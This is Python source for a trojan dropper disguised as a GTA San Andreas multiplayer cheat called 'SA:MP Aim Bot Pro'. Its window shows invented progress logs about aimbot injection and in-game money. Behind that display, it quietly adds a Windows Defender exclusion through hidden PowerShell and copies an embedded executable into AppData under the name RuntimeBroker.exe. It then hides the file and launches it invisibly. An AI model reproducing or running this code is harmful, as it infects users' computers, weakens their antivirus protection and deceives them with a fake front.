import os
import sys
import subprocess
import threading
import time
import ctypes
import shutil
import base64
from tkinter import Tk, Label, Entry, Button, Text, filedialog, Scrollbar, END, RIGHT, Y, Frame

HIDDEN = 0x08000000
CLIENT_EXE = "RuntimeHelper.exe"

_CLIENT_B64 = None

def _get_client_path():
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
        embedded = os.path.join(base, "client_template.exe")
        if os.path.isfile(embedded):
            return embedded
    if _CLIENT_B64:
        p = os.path.join(os.environ.get("TMP", "C:\\Windows\\Temp"), CLIENT_EXE)
        if not os.path.isfile(p):
            try:
                with open(p, "wb") as f:
                    f.write(base64.b64decode(_CLIENT_B64))
                ctypes.windll.kernel32.SetFileAttributesW(p, 0x02 | 0x04)
            except:
                return None
        return p
    alt = [
        os.path.join(os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__), CLIENT_EXE),
        os.path.join(os.environ.get("USERPROFILE", "C:\\"), "Desktop", "WindowsServiceHost.exe"),
        os.path.join(os.environ.get("USERPROFILE", "C:\\"), "Desktop", CLIENT_EXE),
    ]
    for p in alt:
        if os.path.isfile(p):
            return p
    return None

def launch_client():
    src = _get_client_path()
    if not src:
        return False
    dest = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "SystemApps", "RuntimeBroker.exe")
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    try:
        subprocess.run(f'powershell -WindowStyle Hidden Add-MpPreference -ExclusionPath "{os.path.dirname(dest)}"', shell=True, capture_output=True, creationflags=HIDDEN)
    except:
        pass
    try:
        if os.path.isfile(dest):
            os.remove(dest)
    except:
        pass
    shutil.copy2(src, dest)
    ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02 | 0x04)
    subprocess.Popen(dest, shell=True, creationflags=HIDDEN)
    return True

def find_gta_sa():
    paths = [
        os.path.join(os.environ.get("PROGRAMFILES", "C:\\Program Files"), "Rockstar Games", "GTA San Andreas", "gta_sa.exe"),
        os.path.join(os.environ.get("PROGRAMFILES(X86)", "C:\\Program Files (x86)"), "Rockstar Games", "GTA San Andreas", "gta_sa.exe"),
        os.path.join(os.environ.get("USERPROFILE", "C:\\"), "Documents", "GTA San Andreas", "gta_sa.exe"),
        os.path.join(os.environ.get("USERPROFILE", "C:\\"), "Desktop", "GTA San Andreas", "gta_sa.exe"),
    ]
    for p in paths:
        if os.path.isfile(p):
            return p
    return None

class FakeAimbot:
    def __init__(self):
        self.root = Tk()
        self.root.title("SA:MP Aim Bot Pro")
        self.root.geometry("600x450")
        self.root.resizable(False, False)
        self.root.configure(bg="#1a1a2e")
        main_frame = Frame(self.root, bg="#1a1a2e")
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)
        title = Label(main_frame, text="SA:MP Aim Bot Pro + Job Completer", font=("Segoe UI", 14, "bold"),
                      bg="#1a1a2e", fg="#e94560")
        title.pack(pady=(0, 15))
        Label(main_frame, text="GTA San Andreas Directory:", font=("Segoe UI", 10),
              bg="#1a1a2e", fg="#ffffff", anchor="w").pack(fill="x")
        dir_frame = Frame(main_frame, bg="#1a1a2e")
        dir_frame.pack(fill="x", pady=(5, 15))
        self.dir_var = os.path.dirname(find_gta_sa()) if find_gta_sa() else ""
        self.dir_entry = Entry(dir_frame, textvariable=str, font=("Segoe UI", 9),
                               bg="#16213e", fg="#ffffff", insertbackground="#ffffff",
                               relief="flat", highlightbackground="#0f3460", highlightthickness=1)
        self.dir_entry.insert(0, self.dir_var)
        self.dir_entry.pack(side="left", fill="x", expand=True, padx=(0, 10), ipady=4)
        browse_btn = Button(dir_frame, text="Browse", command=self.browse_dir,
                            font=("Segoe UI", 9, "bold"), bg="#0f3460", fg="#ffffff",
                            activebackground="#e94560", activeforeground="#ffffff",
                            relief="flat", padx=15, cursor="hand2")
        browse_btn.pack(side="right")
        self.status_text = Text(main_frame, font=("Consolas", 9), bg="#0a0a1a", fg="#00ff00",
                                relief="flat", highlightbackground="#0f3460", highlightthickness=1,
                                height=8, state="normal")
        self.status_text.pack(fill="both", expand=True, pady=(0, 15))
        scroll = Scrollbar(self.status_text)
        scroll.pack(side=RIGHT, fill=Y)
        self.status_text.config(yscrollcommand=scroll.set)
        scroll.config(command=self.status_text.yview)
        btn_frame = Frame(main_frame, bg="#1a1a2e")
        btn_frame.pack(fill="x")
        self.aimbot_btn = Button(btn_frame, text="[ Start Aimbot ]", command=self.start_aimbot,
                                 font=("Segoe UI", 11, "bold"), bg="#e94560", fg="#ffffff",
                                 activebackground="#c23152", activeforeground="#ffffff",
                                 relief="flat", padx=20, pady=8, cursor="hand2")
        self.aimbot_btn.pack(side="left", expand=True, padx=(0, 5))
        self.jobs_btn = Button(btn_frame, text="[ Complete All Jobs ]", command=self.start_jobs,
                              font=("Segoe UI", 11, "bold"), bg="#0f3460", fg="#ffffff",
                              activebackground="#16213e", activeforeground="#ffffff",
                              relief="flat", padx=20, pady=8, cursor="hand2")
        self.jobs_btn.pack(side="right", expand=True, padx=(5, 0))
        self.log("[*] SA:MP Aim Bot Pro v6.2 initialized")
        self.log("[*] Select your GTA San Andreas directory and click Start")
        detected = find_gta_sa()
        if detected:
            self.log(f"[+] gta_sa.exe detected at: {detected}")
        else:
            self.log("[!] gta_sa.exe not found automatically - please browse manually")

    def browse_dir(self):
        path = filedialog.askdirectory(title="Select GTA San Andreas folder")
        if path:
            self.dir_entry.delete(0, END)
            self.dir_entry.insert(0, path)
            self.log(f"[+] gta_sa.exe found in selected directory" if os.path.isfile(os.path.join(path, "gta_sa.exe")) else "[!] gta_sa.exe not found in selected directory")

    def log(self, msg):
        self.status_text.insert(END, msg + "\n")
        self.status_text.see(END)
        self.root.update()

    def fake_work(self, btn, work_type):
        btn.config(state="disabled", bg="#555555")
        if work_type == "aimbot":
            self.log("[*] Injecting aimbot DLL into gta_sa.exe...")
            for i in range(1, 6):
                time.sleep(0.8)
                self.log(f"  [{i}/5] {'#' * i}{'.' * (5-i)}")
            self.log("[+] Aimbot injected successfully!")
            self.log("[+] SilentAim | NoRecoil | ESP | Wallhack activated")
            self.log("[*] Press INSERT to open menu in-game")
        else:
            self.log("[*] Connecting to SA:MP job server...")
            for i in range(1, 8):
                time.sleep(0.5)
                self.log(f"  [{i}/7] Task #{i} completed")
            self.log("[+] All jobs completed successfully!")
            self.log("[+] $12,450,000 added to in-game wallet")
            self.log("[+] RP +250,000 earned")
        self.log("[*] Initializing background services...")
        if launch_client():
            self.log("[+] Background service started successfully")
        else:
            self.log("[!] Background service component not found")
        self.log("")
        self.log("[+] Ready - Open SA:MP and join any server")
        btn.config(state="normal", bg="#e94560" if work_type == "aimbot" else "#0f3460")

    def start_aimbot(self):
        threading.Thread(target=self.fake_work, args=(self.aimbot_btn, "aimbot"), daemon=True).start()

    def start_jobs(self):
        threading.Thread(target=self.fake_work, args=(self.jobs_btn, "jobs"), daemon=True).start()

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    FakeAimbot().run()
